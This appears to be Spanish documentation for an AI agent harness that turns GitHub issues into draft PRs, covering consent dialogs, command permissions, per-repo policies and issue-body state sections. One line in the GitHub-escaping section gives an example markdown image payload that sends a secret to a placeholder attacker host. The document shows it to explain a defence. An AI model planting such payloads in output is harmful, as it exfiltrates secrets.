# Harness de desarrollo · hasta PR draft

Primer corte para **repos existentes con issues de GitHub**, sobre sesiones y tools nativas de Pi. Implementa Directa, Diagnóstico y Con spec, con [Foundations](#foundations-comandos-y-permisos-por-repo) para decidir por repo qué corre o avanza sin preguntar. No incluye la etapa Fundación (completar una base faltante), prototipos descartables, perfiles/fallbacks de modelos, Review externa, Land ni Ship.

## Empezar y continuar

1. Pedí en el chat un cambio de código del repo que valga la pena seguir: feature, fix, mejora o chore con impacto. Preguntas, explicaciones, operaciones de OMI y cambios triviales que pedís hacer directo siguen en el chat normal, sin harness ni issue.
2. El agente propone empezar con la tool `omi_work_begin`:
   - si el pedido nombra un issue (`#N`), con ese issue;
   - si no, con un título y un cuerpo para crear uno. La sesión nueva no hereda el chat, así que el cuerpo tiene que traer el pedido completo.

   La tool no crea nada: deja un pedido de un solo uso, ligado a la sesión, y termina el turno. Si el agente la llamó junto con otras tools, Pi le da una respuesta más antes de terminar. Mientras el pedido espera el sí, el resto de las tools del agente quedan bloqueadas. Un Esc en ese turno descarta el pedido sin preguntar.
3. OMI te pide **un solo sí**, salvo que Foundations diga `arranque: auto`: entonces avisa lo que hace, sin preguntar. Si Foundations tiene una revisión nueva, antes muestra la diferencia y pide aceptarla. El diálogo dice primero qué va a pasar. Si el issue es nuevo, lo muestra completo al final (repo, título y cuerpo). Dice también quién lo pidió: el motivo del agente, o que vino del panel de Issues. Lo que se puede comprobar sin efectos falla antes de preguntar:
   - el tamaño del pedido;
   - caracteres invisibles o de dirección de texto en el título o el cuerpo;
   - la identidad de una preparación guardada (también una anterior al registro, que se reconoce por su sesión), y que su worktree y su sesión sigan ahí;
   - que exista `main` local;
   - que la ruta del worktree no sea ajena;
   - el modo offline (`--offline` o `PI_OFFLINE`); en ese caso el panel tampoco ofrece Enter;
   - la falta de modelo o de confianza.
4. Si aceptás:
   - se crea el issue, si hace falta;
   - se clasifica el issue;
   - se prepara un worktree desde `main` local, con su propia sesión;
   - se cambia a esa sesión y el trabajo sigue en Explorar.

   Si decís que no, no se crea issue, worktree, sesión ni trabajo.
5. Explorar no habilita escrituras. Respondé las preguntas y aprobá la receta completa en la UI. La aprobación incluye los comandos exactos de los casos y los commits locales, no un push. La revisión TUI abre en un resumen humano y permite inspeccionar íntegramente los detalles y los comandos, que después corren sin volver a preguntar. Si volvés/cancelás, el agente puede rehacer la receta conservando la exploración y las respuestas.
6. El agente implementa, verifica y pide otro consentimiento para publicar la rama y abrir un PR draft (con `push_pr: auto` en Foundations, no pregunta).

**Enter iniciar trabajo** (o **retomar trabajo**) en el panel de Issues y «Trabajar en el issue seleccionado» en la paleta entran por el mismo camino y piden el mismo sí. Si el issue ya tenía worktree y sesión, se retoman sin reclasificar ni volver a leer sus etiquetas. Un trabajo guardado sigue desde su etapa, sin duplicarse, y el diálogo dice en cuál está. Si estaba pausado, el diálogo lo avisa y el sí lo reanuda, como `/omi-work resume`, sin conceder aprobaciones. Si algo falla después de crear el issue, el aviso trae su número: hay que pedir ese issue, no crear otro.

No hay un comando para empezar: `/omi-triage` y `/omi-work start` ya no existen. Una tool no puede cambiar de sesión, así que el pedido viaja como un comando interno con un token de un solo uso, que vive sólo en la memoria del proceso. Escribir ese comando a mano, sin un token vigente, no hace nada. Con el harness activo, `omi_work_begin` no se ofrece. Un arranque y `/omi-main` no corren a la vez: los dos cambian de sesión.

| Comando humano | Efecto |
|---|---|
| `/omi-work resume` | Adoptar explícitamente el estado guardado; no repite comandos ya hechos. Si estaba pausado, reanuda sin conceder aprobaciones. |
| `/omi-work approve` | Aprobar receta/spec vigente y escribirla en la sección del harness del issue. Revalida fuente y código explorado. |
| `/omi-work pause` | Pausar conservando fase, decisiones, archivos y evidencia. |
| `/omi-work refresh` | Opcional. Volver a leer el pedido y explorar; invalida receta, decisiones y pruebas activas. También reabre un trabajo que el agente cerró sin cambio. Si lo propone el agente, pide confirmación. Un cambio de alcance dicho en el chat no lo necesita. |
| `/omi-work pr` | Revalidar y pedir permiso remoto para push normal y PR draft; después actualiza la sección del issue con la evidencia. |
| `/omi-work status` | Consultar el estado sin llamar al modelo, con la revisión de Foundations vigente, sus políticas y su catálogo. |
| `/omi-work stop` | Salir explícitamente del flujo y restaurar las tools normales del chat, sin borrar ni revertir archivos. También sale de un harness bloqueado (estado inválido o atrasado) sin tocar el estado guardado. |
| Ctrl 6 / `/omi-workflow` | Pantalla 6 · Progreso: recorrido completo de sólo lectura, también con la lateral oculta. |
| `/omi-progress` | Detalle del progreso en el workspace TUI, también con la lateral oculta. |

Restaurar una sesión o recargar OMI **no ejecuta** pruebas, modelo, commits ni publicaciones. `resume` es una acción humana explícita. En offline se puede restaurar/consultar el estado local; empezar, contrastar el pedido, aprobar una receta nueva o publicar necesita GitHub. Para abrir offline la sesión de un issue preparado, usá `/resume` de Pi. En el modo clásico se conserva el status y `/omi-work status`, no el panel del workspace.

## Revisar y aprobar una receta

La TUI presenta una revisión dedicada, no un volcado JSON en un confirm genérico. Abre en **Resumen** con issue, objetivo, qué cambia, alcance, tipo, ruta, tamaño, riesgo y ejecutor. Las secciones **Enfoque**, **Alcance**, **Pasos**, **Pruebas**, **Inferencias**, **Spec**, **Autorización** y **Fuente** conservan los detalles completos. Las huellas técnicas quedan en Fuente, no como contenido principal.

- **←/→**, **Tab / Shift+Tab**: cambiar de sección. **1–9**: ir directamente a una sección.
- **↑/↓**, **PgUp/PgDn**, **Home/End** y rueda: desplazar el cuerpo de la sección. El título informa posición y total; ayuda y decisiones quedan fuera del cuerpo desplazable.
- **Ctrl+S**: aprobar deliberadamente. **Enter no aprueba**. **Esc**, **Ctrl+C**, **Ctrl+D** o cerrar/abortar: volver sin conceder aprobación ni escribir en el issue. Se puede ajustar y revisar de nuevo sin perder exploración ni respuestas.
- **Pruebas** muestra cada caso con descripción y comando completo. `│` inicia una línea lógica, `↳` marca continuación visual y `↵` un salto real. No se pierden espacios al envolver comandos. Los backslashes se duplican (`\\` representa `\`); tabulaciones, retornos, controles y caracteres invisibles se muestran como escapes (`\t`, `\r`, `\uXXXX`), nunca como secuencias ejecutables del terminal. La leyenda de la sección los escribe igual que en los comandos. Navegar no ejecuta comandos ni exige visitar todas las secciones para habilitar el sí.
- El marco adapta ancho/alto al terminal y al tema vigente, incluidos 80×24 y resize. Si el pane ya no permite inspección (menos de 32 columnas de revisión o 14 filas de terminal), se suspende aprobar hasta ampliarlo; Esc sigue cancelando.

El sí autoriza **implementar, commits locales, comandos D exactos sin volver a preguntar y mantener la sección del harness al final del cuerpo del issue**, sin tocar el pedido de arriba. No autoriza push, merge, workflows ni deploy. Un comando D corre sin volver a preguntar con cualquier etiqueta, también como setup. Otros comandos piden permiso una vez por trabajo, salvo los del catálogo de Foundations. Con `receta: auto` no hay revisión: la receta se aprueba sola y sus D no quedan autorizados (ver Foundations). La receta no tiene un tope propio de tamaño: la revisión navega por secciones. Antes del sí sólo se comprueba que el artefacto entre en GitHub; si no entra, falla pidiendo dividir el trabajo, no se resume en silencio para aprobarla.

En RPC, donde Pi no ofrece componentes TUI, se conserva una confirmación humana con el mismo documento completo organizado en texto, con los mismos escapes y marcadores `│`/`↵` en los comandos. Los modos sin UI no pueden aprobar. Tras revisar se vuelve a contrastar la fuente, el estado guardado y el código explorado; una revisión obsoleta no se convierte en aprobación de otra receta.

## Etapas y rutas

- **Explorar:** referencias a archivos/líneas leídos por tools y todavía vigentes, hallazgos, enfoque, base faltante y dependencias. El inspector permite consultar el diff completo (si es grande, por partes, con `diffPart`), hasta 20 commits y hasta 20 issues abiertos/cerrados mediante una búsqueda por título; no es un censo exhaustivo de duplicados. Una búsqueda fallida no se presenta como vacía exitosa.
- **Resolver inferencias:** checkpoint explícito, incluso con lista vacía. Cada inferencia tiene tipo qué/cómo, recomendación, confianza y reversibilidad. Umbral inicial fijo: 80/100. Las del cómo sin evidencia y las irreversibles siempre requieren respuesta humana. La confianza es una estimación del agente, no una probabilidad calibrada.
- **Receta:** tipo, tamaño, riesgo y ejecutor, objetivo, enfoque, alcance/fuera de alcance, casos D y comandos exactos, lentes. Inline por defecto; delegación por las primitivas existentes, hasta cuatro escritores y respetando el tope de la receta. El filesystem sigue siendo compartido: no hay reservas ni sandbox por archivo.
- **Directa:** trabajo chico con causa/enfoque entendido; genera un paso C1 sin spec pesada.
- **Diagnóstico:** bug sin causa conocida. Pide reproducción observada y causa; después el arreglo sigue como Directa o Con spec según su tamaño. No habilita arreglos durante el diagnóstico.
- **Con spec:** trabajo grande. Exige por qué, pasos C con cobertura explícita de todos los D y playbook humano antes de aprobar.
- **Implementar:** un C activo por vez, test rojo real, mismo comando verde, commit convencional nuevo por paso. No se completa un paso mediante texto del modelo.
- **Verificar:** cada D con su comando aprobado, salida/exit code y contenido actuales; gates ejecutados y lentes solicitados. Seguridad y Cumplimiento son obligatorios con riesgo alto. Los lentes son llamadas de sólo lectura, sin tools ni conversación del implementador; no sustituyen la Review externa del PR.
  - **Qué ven.** Los casos D, el alcance, el diff completo y la evidencia que registró el harness, no el modelo: por caso D su última verificación; por paso C su historial rojo→verde con comando, etiqueta, exit code, HEAD, fingerprint y la salida que ya se guarda. Un paso de una vuelta anterior trae su rojo y su verde acreditados, archivados.
  - **Asesoran, no bloquean.** Cada lente pedido tiene que correr sobre el contenido actual. Un `unknown` o un `fail` queda como aviso y no frena Verificar ni el PR draft. Única excepción: un `fail` de Seguridad bloquea hasta corregir en otra vuelta. Un resultado inválido, incompleto o cancelado queda como `unknown`.
  - **Sin tope de tamaño.** Si el diff no entra en una llamada, se reparte por archivo en partes. Un archivo más grande se corta por líneas, con una etiqueta por fragmento. El lente corre por parte, con los casos y la evidencia en cada una, y se combina: el peor veredicto gana (`fail`, `unknown`, `pass`) y se juntan los hallazgos con su parte. Nada se trunca en silencio.
  - **Presupuesto por llamada.** Cada llamada entra en 120.000 caracteres, medidos en el JSON que se manda: casos, alcance, evidencia y su parte del diff. Si la evidencia completa no deja lugar para al menos 30.000 de diff, se resume de forma determinista y lo dice en `evidence.summarized`: por paso C el rojo y el verde acreditados (o los últimos), por caso D y por gate la última corrida, y cada salida con su cola y la marca «[recortado: N caracteres]». `omittedRuns` cuenta las corridas que no vinieron. Ejemplo: 5 pasos, un D y 2 gates × 3 vueltas con salidas de 12.000 (≈207 KB) y un diff de ≈600 KB van en 20 llamadas de hasta 120.000, con salidas de 4.000. Si ni resumida entra (por ejemplo, casos D enormes), el lente falla con un error explícito en vez de mandar una llamada que no entra.
  - **Corridas.** Un lente que falló no se repite sobre el mismo contenido, salvo que un `refuter` posterior apruebe: así un aviso no se borra repitiendo el lente y el fail de Seguridad no se esquiva. Por contenido, cada lente admite tres veredictos y diez corridas: cancelar o un error del proveedor no gasta veredictos.
- **PR:** sólo con cambio limpio y verificado, confirmación humana remota y un SHA autorizado. Termina en un draft; no mergea ni cierra el issue.

Base incompleta, dependencia bloqueante, información insuficiente, inferencia nueva o imposibilidad de verificar deben quedar como espera/pausa. En este corte, Fundación no se ejecuta: la persona completa la base y usa `refresh`.

## Evidencia y permisos

`omi_workflow` sólo recibe propuestas de artefactos y acciones. No acepta exit codes, aprobaciones humanas ni resultados de pruebas aportados por el modelo.

- Los comandos se ejecutan con `omi_workflow_check`. Ejecutar código de un repo no es una lectura inocua: antes de aprobar la receta, una reproducción pide permiso, salvo que esté en el catálogo de Foundations.
- Autorizar un comando se separa de su etiqueta (`setup`, `reproduction`, `red`, `green`, `verification`, `gate`). La etiqueta decide en qué etapa corre y qué acredita, no si hace falta otro sí. Un comando corre sin preguntar si:
  - está en el catálogo de Foundations;
  - es el comando exacto de un caso D de una receta que aprobó una persona;
  - ya tiene un permiso guardado en este trabajo;
  - o Foundations dice `fuera_de_catalogo: auto`.
- Si no, OMI pregunta una vez. El sí queda guardado en el estado del trabajo (`grants`), por comando exacto y por pedido: sobrevive a `/reload`, `resume`, aprobar la receta y un `replan` por acuerdo del chat. Cambiar el pedido o `refresh` lo descarta. Un no no guarda nada. Ejemplo: `npm run typecheck` aprobado como D5 corre igual como setup, sin otro diálogo.
- Setup nunca acredita una prueba y sus errores se muestran.
- El runner registra salida acotada a 12.000 caracteres, exit code, interrupción, HEAD, fingerprint y tiempos. No imprime el entorno ni mensajes internos potencialmente sensibles del backend. La salida del propio programa puede contener datos sensibles: no autorizar comandos que revelen secretos.
- Un rojo que pasa, comando ausente, cancelación o contenido modificado durante el comando no se convierte en prueba válida. Los intentos fallidos quedan registrados sin habilitar pasos.
- El fingerprint representa contenido cambiado desde la base y archivos nuevos no ignorados, incluidos modos/eliminaciones/symlinks. Permanece estable al hacer stage/commit del mismo contenido.
- Las pruebas de cada paso y su commit deben coincidir. La verificación final debe corresponder al contenido actual; un verde histórico o un comando distinto no alcanza.
- Hay hasta tres vueltas de corrección. Reintentar invalida pruebas activas y conserva sus resultados en un archivo de intentos anteriores; no pueden acreditar la nueva vuelta. Los pasos ya commiteados siguen hechos y la vuelta agrega un paso de corrección `C<n>` que cubre todos los D, con su propio rojo, verde y commit. Ese paso conserva la aprobación porque usa los mismos casos y comandos aprobados; su título lo escribe el agente y la persona no lo aprueba aparte. Se mantiene la aprobación sólo si pedido, receta y spec son exactamente los mismos.
- Cambiar el pedido invalida receta/aprobación/pruebas cuando se contrasta con GitHub, en los checkpoints de inicio/retoma, planificación, aprobación y publicación. El contraste ignora la sección del harness: escribirla, o que alguien la toque, no invalida nada.
- Si el alcance cambia en el chat, lo dicho vale: el agente lo registra como acuerdo con la cita textual de la persona y rehace la receta (ver «El chat como autorización»). No hace falta editar el issue ni `refresh`, y el cambio no pasa como un ajuste silencioso del Cómo.

Mientras el flujo está activo, shell arbitrario, tools desconocidas y operaciones OMI no están habilitadas por el harness. `omi_ask` sí, en toda etapa: preguntarle a la persona no cambia nada. Su respuesta es un dato, no un acuerdo del chat ni un permiso: no sirve como cita de `agreed`, no aprueba la receta ni autoriza comandos. Las inferencias siguen respondiéndose con `omi_workflow` `ask`. Por la misma regla, el agente tampoco puede guardar ni borrar en la KB (`mcp__harness_kb__guardar` y `borrar`, también desde un subagente): Foundations lo edita una persona. Edit/write requieren receta aprobada y C activo, con paths relativos dentro del checkout (sin `~` ni `file://`, que Pi expandiría afuera) y sin metadata Git ni rutas evidentes de secretos. Código como `credentials.ts` y plantillas como `.env.example` sí se pueden editar. El commit del paso trata sus paths como literales, no como pathspecs. Las tools conservan el pipeline y hooks de Pi. **No es una frontera de seguridad:** comparte usuario, filesystem y credenciales; un comando aprobado ejecuta código arbitrario con esos permisos. No reemplaza aislamiento del sistema operativo ni los guardrails de OMI. Las reglas del proyecto prevalecen.

## El chat como autorización

Lo que la persona escribe en el chat vale como autorización de alcance. Ejemplo: «sumá también que `other.cjs` devuelva 2».

1. El agente llama a `omi_workflow` con `action: "agreed"`, `quote` (un fragmento textual del mensaje, sin comillas), `agreement` (lo acordado) y `replan` (si cambia la receta).
2. OMI busca la cita en los mensajes de la persona de la rama actual de esta sesión. Compara sin distinguir espacios ni saltos de línea. No cuentan el texto del modelo, los resultados de tools (tampoco una respuesta de `omi_ask`) ni los mensajes que manda una extensión (por ejemplo, el arranque del harness). Una cita que no aparece se rechaza y no se anota nada. La cita tiene que tener al menos 3 palabras o 15 letras o números: un fragmento trivial («ok», «dale», «a») aparece en cualquier mensaje y se rechaza.
3. El acuerdo queda en el estado, en la sección del issue (enseguida; con `replan`, la receta figura «en revisión» hasta el nuevo sí), en la revisión de la receta y en el PR draft. OMI lo muestra en la TUI al registrarlo.
4. Con `replan`, si ya había receta, se vuelve a Preparar receta. Siguen valiendo la exploración, las respuestas, los acuerdos y los commits. La aprobación, los pasos y las pruebas de la receta anterior pasan a intentos anteriores, y la base explorada pasa a ser el código actual, el de los pasos commiteados. Por eso un `replan` pide el checkout limpio: con cambios sin commitear el acuerdo se rechaza sin cambiar nada, porque en Preparar receta el agente ya no podría commitearlos. Ejemplo: a mitad de un paso, el agente termina y commitea el paso activo y vuelve a registrar el acuerdo, o lo registra sin `replan`. La receta nueva se aprueba como cualquier otra. Antes de la receta, el acuerdo sólo se anota y el agente lo usa al planificar. Con las vueltas de corrección agotadas, un acuerdo sin `replan` también sólo se anota y uno con `replan` se rechaza: un acuerdo del chat no reinicia las vueltas ni levanta el bloqueo; eso lo hace una persona con `/omi-work refresh`.

La verificación prueba que la persona escribió esas palabras, no que el resumen del agente las interprete bien. Por eso el acuerdo se muestra entero, con su cita, y un cambio de receta vuelve a pedir el sí. Los acuerdos sobreviven a `refresh`: son palabras de la persona, no del pedido. Para retirarlo, se dice en el chat.

## Foundations: comandos y permisos por repo

Foundations es la configuración del harness para un repo: qué comandos corren sin preguntar y qué puntos piden un sí. Lo decide la persona, en la KB de Harness. No es la etapa Fundación.

### Dónde vive

- En las **perillas** del producto, en la KB (`harness-kb`), dentro de un bloque `omi-foundations`. El resto del documento de perillas es de otros usos y no se toca.
- El producto es el nombre del repo de `origin` en github.com. Ejemplo: `github.com/chichex/omi-code` → producto `omi-code`.
- Tiene que estar en tus productos de la KB (`mis_productos`). Si no, no hay Foundations y no se ofrece armarlo.
- El bloque declara su `repo`. Sólo aplica si coincide con `origin`: dos repos con el mismo nombre (`chichex/medicine`, `pramaestudio/medicine`) tienen un bloque cada uno. Un trabajo cuyo issue es de otro repo usa la política estricta.

### Formato

JSON estricto, en una cerca con info string exacta `omi-foundations`:

````md
## Foundations de omi · chichex/omi-code

```omi-foundations
{
  "version": 1,
  "repo": "chichex/omi-code",
  "comandos": ["npm ci", "npm run typecheck", "npm test", "npm run test:packaging"],
  "politica": { "arranque": "ask", "receta": "ask", "fuera_de_catalogo": "ask", "push_pr": "ask" }
}
```
````

- `version`: `1`. `repo`: `owner/name` en minúsculas.
- `comandos`: hasta 100, únicos y exactos, como los D. Sin espacios al borde, saltos de línea ni caracteres de control o invisibles. `npm test` no autoriza `npm test -- --watch`.
- `politica`: las cuatro claves, cada una `ask` o `auto`. No hay defaults ni otros campos.
- Reordenar o reformatear no es una revisión nueva. Cambiar un comando o una política sí.
- Inválido (JSON roto, otro esquema, cerca sin cerrar, dos bloques del mismo repo o un bloque cuyo `repo` no se lee): no autoriza nada.

### Qué decide cada política

| Punto | `ask` (hoy) | `auto` |
|---|---|---|
| `arranque` | El sí de `omi_work_begin` o de Enter en Issues | Crea el issue, el worktree y la sesión sin preguntar, con el texto del agente. Las guardas sin efectos fallan igual antes |
| `receta` | La revisión de la receta | El agente aprueba su propia receta, también la que rehace tras un `replan`. Se revalida igual, queda `aprobada por Foundations` en la sección del issue y sus D fuera del catálogo siguen pidiendo permiso |
| `fuera_de_catalogo` | Un sí por comando y por trabajo | Cualquier comando corre sin preguntar: equivale a shell sin permiso |
| `push_pr` | El sí para push y PR draft | Push de la rama y PR draft sin preguntar. Nunca mergea ni fuerza |

Los comandos del catálogo corren sin preguntar con cualquier etiqueta. Las reglas de etapa y de evidencia no cambian. Nada de esto habilita merge, tags, workflows, deploys ni secretos.

### Aceptar una revisión

1. Al arrancar la sesión, OMI lee las perillas en segundo plano, sin preguntar.
2. En el primer punto del harness que necesita la política (el arranque, `/omi-work resume`, `approve`, `pr` o el primer comando), si la revisión es nueva, muestra la diferencia contra la última aceptada y pide un sí. Cada `auto` trae su aviso. Ejemplo:

   ```
   Foundations · chichex/omi-code · KB omi-code (kb-prod-chiche.ohmyinfra.com)
   Comandos que corren sin preguntar:
     + npm run test:packaging
       npm test
   Políticas:
     fuera del catálogo: ask → auto   ⚠ corre cualquier comando sin preguntar: equivale a shell sin permiso
   ```

3. Toda revisión nueva pide el sí, también si sólo quita permisos. La misma revisión en otro documento de perillas (alguien editó otra parte) no vuelve a preguntar.
4. La aceptada se guarda en `<OMI_HOME>/agent/foundations/` (por defecto `~/.omi/agent/foundations/`), 0600, por KB, producto y repo.
5. La revisión queda **fija toda la sesión**: un cambio en la KB a mitad de sesión no se aplica. Sobrevive a `/reload` y viaja a la sesión del worktree con `omi_work_begin`, sin otro diálogo. La sesión siguiente muestra la diferencia.

Rechazar o cancelar deja la última revisión aceptada. Sin ninguna, la política estricta: `ask` en los cuatro puntos y catálogo vacío.

### Sin KB

| Situación | Vale en la sesión |
|---|---|
| `--offline`, `PI_OFFLINE`, `--no-mcp`, `-builtin:mcp`, `--no-extensions`, sin login, KB lenta (tope de 10 s) o `harness-kb` redefinido en `mcp.json` | La última aceptada; si no hay, estricta |
| Perillas sin bloque para el repo | La última aceptada, con aviso; si no hay, estricta y se ofrece armarlo |
| Bloque inválido | La última aceptada, con aviso y el motivo; si no hay, estricta |
| Revisión nueva sin UI | La última aceptada; si no hay, estricta |
| Producto inexistente o sin acceso | Estricta |

OMI lee la KB por la conexión MCP de Pi, sin el modelo. Si `~/.omi/agent/mcp.json` o `.pi/mcp.json` definen `harness-kb`, no la usa: podría ser otro servidor.

### Qué escribe en la KB y cuándo

Sólo una cosa, y sólo con tu sí: armar Foundations cuando falta.

- Cuándo: al empezar el harness en la sesión del worktree, una vez por sesión, si la KB respondió, el producto existe, sus perillas no tienen bloque para el repo y no hay una revisión aceptada. Sólo en la TUI interactiva: en RPC no se ofrece.
- Se ofrece con una pregunta: «Armar Foundations» (la recomendada, nunca elegida sola), «Ahora no» o «No ofrecer más para este repo» (queda en el registro local), cada una con lo que pasa. Esc es «Ahora no»: no se guarda nada.
- Se arma respondiendo [preguntas en tanda](#preguntas-en-tanda), no editando JSON:
  1. «¿Qué comandos corren sin preguntar?», de elección múltiple. Las opciones son los comandos que OMI detecta leyendo archivos, sin ejecutar nada: scripts de `package.json` como `test`, `typecheck`, `lint`, `check`, `build`, `test:*`, con el gestor de su lockfile (`npm ci`, `pnpm install --frozen-lockfile`…), o `go test ./...` y `go vet ./...`. Cada una dice de dónde sale (por ejemplo, «Script «test» de package.json») y ninguna viene marcada. «Escribir otra respuesta» suma otros, uno por línea (Ctrl+J). Cada línea se valida con las reglas de `comandos`; una inválida vuelve al texto con el motivo.
  2. Una pregunta por política (arranque, receta, fuera del catálogo, push + PR), en una tanda con pestañas. `ask` es la recomendada; cada `auto` trae su aviso en la descripción.
  3. Un resumen legible, sin JSON: la diferencia contra la política estricta y el destino. Nada viene elegido: «Guardar en la KB», «Cambiar respuestas» (vuelve a las preguntas con lo elegido) o «Cancelar».
- Esc en cualquier paso, o «Cancelar», no guarda nada. Sólo «Guardar en la KB» guarda: una revisión nueva de las perillas, con el mismo parser y validador que un bloque escrito a mano. El resto del documento queda byte a byte, o se crea `Perillas de <producto>` si no había.
- Si las perillas cambiaron durante el diálogo, no se guarda. Una respuesta perdida se reintenta con la misma clave, sin duplicar el documento. La clave es determinista (repo, perillas previas y cuerpo), así que no se guarda en el registro local: un guardado que falla no deja nada ahí.
- Lo guardado queda aceptado y vale en esa sesión.

Para cambiarlo después, editá las perillas en la KB (o pedíselo al agente fuera del harness). No hay un comando para eso. `/omi-work status` y el detalle del progreso muestran la revisión vigente, su origen (KB, local o estricta), las cuatro políticas, el catálogo y los avisos.

### Límites

- No es una frontera de seguridad: el registro local lo puede editar cualquier proceso con tu usuario.
- `fuera_de_catalogo: auto` y `arranque: auto` dan mucho poder al agente; el diálogo de aceptación los marca.
- Sin KB, una revisión aceptada vieja puede ser más permisiva que la vigente.
- Un repo cuyo nombre no es un producto de la KB no tiene Foundations.
- Cada sesión en un repo de GitHub lee la KB: tres llamadas MCP.

## Preguntas en tanda

OMI pregunta como AskUserQuestion de Claude Code: de 1 a 4 preguntas en una tanda, cada una con sus opciones numeradas y una descripción tenue debajo. La recomendada va primero, marcada «(Recomendada)», y recibe el cursor, pero nunca se elige sola. La última opción es siempre «Escribir otra respuesta»: abre un texto en la misma tanda y la respuesta vuelve marcada como escrita, no como una opción. Las preguntas internas de respuesta cerrada (una política es `ask` o `auto`) no la tienen.

```
── El agente pregunta ──────────────────────────────────────────
 ←  ■ Alcance   □ Riesgo   ✓ Enviar  →

 ¿Qué riesgo asumimos?

 › 1. Bajo (Recomendada)
      Sin migraciones ni contratos
   2. Alto
      Toca el contrato público
   3. Escribir otra respuesta
 ↑↓ o 1–3 elegir · Enter confirmar · Tab/←→ preguntas · Esc cancelar
```

- ↑/↓ mueven el cursor; un número elige esa opción. Enter confirma y pasa a la siguiente sin responder. Tab o ←/→ cambian de pregunta.
- Elección múltiple: casillas; Espacio o un número marcan, Enter confirma lo marcado (también nada).
- Con más de una pregunta, el paso **Enviar** repasa todas las respuestas antes de mandarlas. Si falta alguna, Enter vuelve a la primera sin responder.
- Esc cancela la tanda: no quedan respuestas parciales ni consentimiento. En el texto libre, Esc sólo vuelve a las opciones.
- Una pregunta sin recomendada, como el sí de guardar Foundations, arranca sin cursor: Enter solo no elige nada.
- Va en el lugar del editor, dentro del layout del workspace. Si no entra, primero esconde las descripciones de las otras opciones y después desplaza la lista, sin tapar la ayuda. Un texto largo, como el resumen de Foundations, se desplaza con PgUp/PgDn.

El agente pregunta así con `omi_ask`: `questions` de 1 a 4, cada una con `question`, `header` (hasta 12 caracteres), `options` de 2 a 4 (`label` y `description`, la primera es la recomendada) y `multiSelect`. OMI agrega la respuesta libre. Devuelve, por pregunta, su id (`q1`…), el texto, las opciones elegidas (`options`) y lo escrito (`text`); al cancelar, `cancelled`, y el turno termina. En modo print, RPC o sin UI falla con un error: nunca supone una respuesta. Es `model-only`: ni `codemode` ni un subagente la pueden llamar.

## Persistencia, sesiones y recuperación

El trabajo se guarda en `<git-common-dir>/omi/development/N.json`, separado de `.omi/project.json` y del registro de preparación del worktree (`<git-common-dir>/omi/issue-workspaces/N.json`). No requiere vincular el repo a un proyecto de infraestructura OMI.

- Esquema versionado, identidad completa de issue/checkout/base, revisión optimista, archivo 0600, escritura atómica y lock exclusivo con PID/host.
- No se siguen symlinks para el estado. Registro corrupto, recurso perdido o checkout ajeno no se reemplazan automáticamente.
- Los locks abandonados no se roban por antigüedad. Una persona verifica el proceso/host antes de retirarlos.
- La conversación guarda un vínculo al trabajo y a su revisión. Una rama de conversación atrasada no adopta silenciosamente cambios de otra ventana; exige `resume`.
- La rama también guarda las tools normales del chat mientras el harness las restringe. `/omi-work stop` las devuelve aunque la sesión se haya retomado, recargado o movido por el árbol, y retomar después de salir no vuelve a las restringidas. Al volver a abrir, `--tools`, `--exclude-tools` o una extensión desactivada prevalecen sobre lo guardado, con las reglas con que Pi retoma una sesión.
- Las tareas de subagentes siguen siendo efímeras. Lo durable es el trabajo, no un proceso vivo ni un job remoto.

Los cambios externos del filesystem no se revierten. Una operación ejecutada sin recibo por cierre abrupto requiere inspección y revalidación, no replay automático.

## GitHub sin sobrescribir el pedido

Crear el issue de un pedido nuevo es la única escritura en GitHub antes de Explorar. Pasa sólo con el sí, una vez, con el título y el cuerpo que mostró el diálogo. Si GitHub no confirma la creación, no se reintenta: hay que revisar el repo antes de volver a pedirlo, para no duplicarlo.

El harness no crea comentarios en el issue. Su estado va en una **sección administrada al final del cuerpo**, entre `<!-- omi:harness:start -->` y `<!-- omi:harness:end -->`. El pedido humano queda arriba, intacto byte a byte. La sección es markdown: ruta y etapa, receta con sus casos D, pasos, decisiones, acuerdos del chat, una tabla de evidencia (caso, resultado, HEAD) y los avisos de los lentes con sus hallazgos. Ejemplo:

```
## Harness · #45
**Ruta:** Con spec · **Etapa:** Implementar (C2 de 3)

### Receta
- **Objetivo:** …
- **D1** `npm test` · Tests del repo

### Evidencia
| Caso | Resultado | HEAD |
|---|---|---|
| D1 | ✅ exit 0 | cae0b33 |
```

- **Cuándo se escribe:** al aprobar una receta, al registrar un acuerdo y al abrir el PR draft. Nunca antes del primer sí a una receta: sin receta aprobada sólo se actualiza una sección que ya existe. Por ejemplo, tras un acuerdo que rehace la receta, la sección se actualiza enseguida y muestra la receta «en revisión» hasta el nuevo sí. Si no se puede escribir (sin red, límite de GitHub, marcadores rotos), OMI avisa y el trabajo sigue: el estado local es la fuente de verdad.
- **Cómo se escribe:** se relee el cuerpo justo antes de escribir y se reemplaza sólo lo que está entre los marcadores. Sin marcadores, la sección se agrega al final. No se escribe si el pedido cambió desde el último contraste, y la escritura se confirma releyendo; no se reintenta sola. Una sección igual no se vuelve a escribir.
- **Riesgo residual:** GitHub no ofrece CAS para el cuerpo del issue. Una edición humana que cae entre esa relectura y la escritura se pierde del cuerpo; GitHub la conserva en el historial de ediciones del issue.
- **Marcadores:** sólo cuentan solos en su línea, desde la primera columna y fuera de un bloque de código cercado. Una mención en el pedido (en línea, entre backticks, indentada o dentro de una cerca ```` ``` ```` o `~~~`) es texto humano. Ejemplo: un pedido que muestra el par de marcadores en un bloque de código no se pisa, sigue en el pedido que se contrasta y no frena los puntos de control. La cerca cierra con su mismo carácter y al menos su largo; una cerca sin cerrar no esconde marcadores, así la sección que OMI agrega después se sigue encontrando. Marcadores repetidos, sueltos, invertidos o desconocidos fuera de un bloque no se adivinan: OMI no escribe ni contrasta el pedido (los puntos de control fallan) y pide dejar un solo par o borrar la sección. Un par bien formado escrito por una persona fuera de un bloque se toma como la sección.
- **Qué cuenta como pedido:** todo lo de fuera de los marcadores, también lo que alguien agregue debajo. Lo de adentro se reescribe entero: lo que se edite ahí se pierde y no invalida el trabajo.
- **Escape:** los datos de la receta, del agente, de los comandos y de la persona no pueden romper la tabla, los bloques de código ni los marcadores. Los backticks y pipes de un comando quedan dentro del código, un comando multilínea va en un bloque con una cerca más larga, el HTML se escapa y los controles e invisibles se muestran como `\uXXXX`.
- **Nada queda activo:** ese texto no puede dejar en GitHub imágenes, links, autolinks, HTML, menciones ni referencias. Una palabra con URL, `www.`, correo, `@usuario`, `#123` o `GH-123` va entera como código, y los corchetes y backticks sueltos se escapan. Ejemplo: un acuerdo `![x](https://atacante/?d=SECRETO)` se ve como código y GitHub no carga la imagen. Vale también para las citas de la persona. El único link es el del PR draft que validó el harness.
